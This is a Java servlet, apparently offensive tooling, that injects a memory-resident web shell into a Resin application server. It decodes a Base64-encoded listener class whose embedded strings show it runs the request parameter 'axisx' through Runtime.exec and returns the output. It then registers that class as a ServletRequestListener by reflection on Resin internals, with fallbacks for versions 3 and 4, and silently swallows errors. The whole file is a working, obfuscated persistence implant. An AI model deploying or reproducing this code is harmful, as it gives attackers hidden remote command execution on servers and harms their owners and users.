package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;

public class InjectListenerByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            Class servletInvocation=classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");

            Object contextRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
            Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
            //此Listener传入参数为axisx
            String ListenerBase64="yv66vgAAADQAxwoAKwBrCQBsAG0IAG4KAG8AcAoAcQByBwBzCgAqAHQIAHULAAYAdgoAKgB3CwApAHgKAHkAcAoAeQB6BwB7CgB8AH0KAHwAfgoAfwCABwCBCgASAIIHAIMKABQAhAcAhQoAFgBrCgAUAIYHAIcKABkAawoAGQCICACJCgAZAIoKABYAiwoAFgCKCgArAIwIAI0KAI4AjwgAkAoAGQCRCgCOAJIIAJMKAJQAlQoAlACWBwCXBwCYBwCZBwCaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMTWVtU2hlbGxMaXN0ZW5lcjsBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEADVN0YWNrTWFwVGFibGUHAJgHAJsHAHMHAHsBAAtDb21tYW5kRXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACcnQBABNMamF2YS9sYW5nL1J1bnRpbWU7AQAEcHJvYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZzdGRlcnIBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwcAnAcAnQcAngcAnwcAgQcAgwcAhQEACkV4Y2VwdGlvbnMBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyOAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHZhcjEBAAR2YXIyAQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsHAJcHAKAHAKEBAApTb3VyY2VGaWxlAQAVTWVtU2hlbGxMaXN0ZW5lci5qYXZhDAAtAC4HAKIMAD4AowEACGxpc3RlbmVyBwCkDAClAKYHAJsMAKcAqAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAF4AXwEABWF4aXN4DACpAEgMAEcASAwAqgCrBwCsDACtAC4BABNqYXZhL2xhbmcvRXhjZXB0aW9uBwCdDACuAK8MALAAsQcAngwAsgCzAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwALQC0AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwALQC1AQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAtgC3AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALgAuQEAAQoMALoAtwwAuAC7DAC8AL0BAAlfcmVzcG9uc2UHAL4MAL8AwAEAAmFhDAC4AMEMAMIAvQEAAmJiBwCgDADDAMQMAMUAxgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQTWVtU2hlbGxMaXN0ZW5lcgEAEGphdmEvbGFuZy9PYmplY3QBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1J1bnRpbWUBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABWZsdXNoAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADWdldFN1cGVyY2xhc3MBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7ACEAKgArAAEALAAAAAUAAQAtAC4AAQAvAAAALwABAAEAAAAFKrcAAbEAAAACADAAAAAGAAEAAAALADEAAAAMAAEAAAAFADIAMwAAAAEANAA1AAEALwAAADUAAAACAAAAAbEAAAACADAAAAAGAAEAAAAOADEAAAAWAAIAAAABADIAMwAAAAAAAQA2ADcAAQABADgANQABAC8AAAD/AAIABwAAAEmyAAISA7YABCu2AAXAAAZNKiy2AAdOLBIIuQAJAgA6BCoZBLYACjoFsgACGQW2AAQtuQALAQA6BhkGGQW2AAwZBrYADacABE6xAAEAEABEAEcADgADADAAAAAyAAwAAAASAAgAEwAQABYAFgAXACAAGAAoABkAMAAbADgAHAA/AB0ARAAgAEcAHgBIACEAMQAAAEgABwAWAC4AOQA6AAMAIAAkADsAPAAEACgAHAA9ADwABQA4AAwAPgA/AAYAAABJADIAMwAAAAAASQA2ADcAAQAQADkAQABBAAIAQgAAABYAAv8ARwADBwBDBwBEBwBFAAEHAEYAAAEARwBIAAIALwAAASkAAwAJAAAAYLgAD00sK7YAEE4ttgAROgS7ABJZGQS3ABM6BbsAFFkZBbcAFToGAToHuwAWWbcAFzoIGQa2ABhZOgfGACAZCLsAGVm3ABoZB7YAGxIctgAbtgAdtgAeV6f/2xkItgAfsAAAAAMAMAAAACoACgAAACMABAAkAAoAJQAQACYAGwAnACYAKAApACkAMgAqAD0AKwBaAC0AMQAAAFwACQAAAGAAMgAzAAAAAABgADsAPAABAAQAXABJAEoAAgAKAFYASwBMAAMAEABQAE0ATgAEABsARQBPAFAABQAmADoAUQBSAAYAKQA3AFMAPAAHADIALgBUAFUACABCAAAAJQAC/wAyAAkHAEMHAFYHAFcHAFgHAFkHAFoHAFsHAFYHAFwAACcAXQAAAAQAAQAOACEAXgBfAAIALwAAATMAAwAGAAAAZwFNAU4rtgAgEiG2ACJOsgACuwAZWbcAGhIjtgAbLbYAJLYAHbYABKcAMDoEK7YAILYAJRIhtgAiTrIAArsAGVm3ABoSJrYAGyy2ACS2AB22AASnAAU6BS0EtgAnLSu2ACjAAClNLLAAAgAEACcAKgAOACwAUgBVAA4AAwAwAAAANgANAAAAMQACADIABAA0AA4ANQAnADwAKgA2ACwAOAA5ADkAUgA7AFUAOgBXAD0AXAA+AGUAQAAxAAAANAAFACwAKwBgAGEABAAAAGcAMgAzAAAAAABnAGIAQQABAAIAZQBjADoAAgAEAGMAZABlAAMAQgAAADQAA/8AKgAEBwBDBwBFBwBmBwBnAAEHAEb/ACoABQcAQwcARQcAZgcAZwcARgABBwBG+gABAF0AAAAEAAEAaAABAGkAAAACAGo=";
            byte[] ListenerClass = new BASE64Decoder().decodeBuffer(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);

            ServletRequestListener listenerObject=(ServletRequestListener)listenerClass.newInstance();

            // 4.X ListenerConfig | 3.X Listener
            Class ListenerConfigCls=null;
            try{
                ListenerConfigCls=classLoader.loadClass("com.caucho.server.webapp.ListenerConfig");
            }catch (Exception e){
                ListenerConfigCls=classLoader.loadClass("com.caucho.server.webapp.Listener");
            }
            Object ListenerConfig=ListenerConfigCls.newInstance();

            Method m1=ListenerConfig.getClass().getDeclaredMethod("setListenerClass",Class.class);
            m1.setAccessible(true);
            m1.invoke(ListenerConfig,listenerClass);

            // // 4.X getClass() ListenerConfig  | 3.X getClass().getSuperClass*() Listener
            Method m2=null;
            try{
                m2=webapp.getClass().getDeclaredMethod("addListener", ListenerConfig.getClass());
            }catch (Exception e){
                m2=webapp.getClass().getSuperclass().getDeclaredMethod("addListener", ListenerConfig.getClass());
            }
            m2.setAccessible(true);
            m2.invoke(webapp,ListenerConfig);

        }catch (Exception e){}
    }
}
